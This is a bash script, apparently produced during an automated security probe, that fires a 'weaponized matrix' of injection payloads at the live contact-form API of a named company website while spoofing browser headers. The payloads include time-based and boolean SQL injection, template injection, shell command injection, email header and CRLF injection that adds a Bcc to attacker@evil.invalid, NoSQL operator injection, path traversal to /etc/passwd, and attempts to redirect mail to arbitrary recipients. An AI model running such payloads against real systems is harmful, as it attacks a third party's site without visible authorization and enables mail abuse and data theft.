#!/bin/bash
# Weaponized matrix against LIVE /api/send (multipart, per site client bundle shape)
H='https://www.infinitycapital.bh'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
O=tool_outputs/wx
mkdir -p $O
post(){ d="$1"; shift; printf "=== %-34s " "$d"; \
  curl -s -m 40 -X POST "$H/api/send" -A "$UA" \
    -H "Origin: https://www.infinitycapital.bh" -H "Referer: $https://www.infinitycapital.bh/contact" \
    "$@" -o $O/last.bin -D $O/last.hdr -w "%{http_code}|%{size_download}"; \
  printf " body=%s\n" "$(head -c 220 $O/last.bin | tr -d '\n')"; \
  grep -i '^x-matched-path\|^x-vercel-mitigated\|^content-type' $O/last.hdr | tr -d '\r' | sed 's/^/     /'; \
  sleep 1; }

BASE=(-F 'fname=Probe' -F 'lname=User' -F 'areacode=+973' -F 'tel=12345678' -F 'cname=Acme Ltd' -F 'subject=Inquiry' -F 'msg=Hello, interested in your services.' -F 'check=' -F 'targets=info@infinitycapital.bh')

post "BASELINE valid"        "${BASE[@]}"
post "NO targets field"      "${BASE[@]:0:8}"
post "targets empty"         "${BASE[@]:0:9}" -F 'targets='
post "targets=invest"        "${BASE[@]:0:9}" -F 'targets=invest'
post "targets arbitrary ext" "${BASE[@]:0:9}" -F 'targets=attacker@evil.invalid'
post "honeypot check filled" "${BASE[@]:0:8}" -F 'check=botfilled' -F 'targets=info@infinitycapital.bh'
post "SQLi time cname"       "${BASE[@]:0:5}" -F "cname=x' AND SLEEP(6)-- -" "${BASE[@]:5:4}"
post "SQLi boolean cname"    -F 'fname=Probe' -F "cname=x' AND '1'='1" -F 'subject=s' -F 'msg=m' -F 'targets=info@infinitycapital.bh'
post "SQLi boolean cname F"  -F 'fname=Probe' -F "cname=x' AND '1'='2" -F 'subject=s' -F 'msg=m' -F 'targets=info@infinitycapital.bh'
post "SSTI msg"              -F 'fname=Probe' -F 'subject=s' -F 'msg={{7*7}}' -F 'targets=info@infinitycapital.bh'
post "SSTI msg jinja"        -F 'fname=Probe' -F 'subject=s' -F 'msg=${7*7}' -F 'targets=info@infinitycapital.bh'
post "CMDi tel"              -F 'fname=Probe' -F 'subject=s' -F 'msg=m' -F "tel=1;sleep 6" -F 'targets=info@infinitycapital.bh'
post "CMDi cname backtick"   -F 'fname=Probe' -F 'subject=s' -F 'msg=m' -F 'cname=`sleep 6`' -F 'targets=info@infinitycapital.bh'
post "Header inj cname"      -F 'fname=Probe' -F 'subject=s' -F 'msg=m' -F "cname=a
Bcc: attacker@evil.invalid" -F 'targets=info@infinitycapital.bh'
post "CRLF subject"          -F 'fname=Probe' -F "subject=s
bcc: attacker@evil.invalid" -F 'msg=m' -F 'targets=info@infinitycapital.bh'
post "NoSQL subj obj"        -H 'Content-Type: application/json' --data '{"subject":{"$ne":1},"fname":"Probe","targets":"info@infinitycapital.bh"}'
post "Path traversal fname"  -F 'fname=../../../../etc/passwd' -F 'subject=s' -F 'msg=m' -F 'targets=info@infinitycapital.bh'
post "Massassign to/from"    -F 'fname=Probe' -F 'subject=s' -F 'msg=m' -F 'to=attacker@evil.invalid' -F 'from=attacker@evil.invalid' -F 'replyTo=attacker@evil.invalid' -F 'targets=info@infinitycapital.bh'
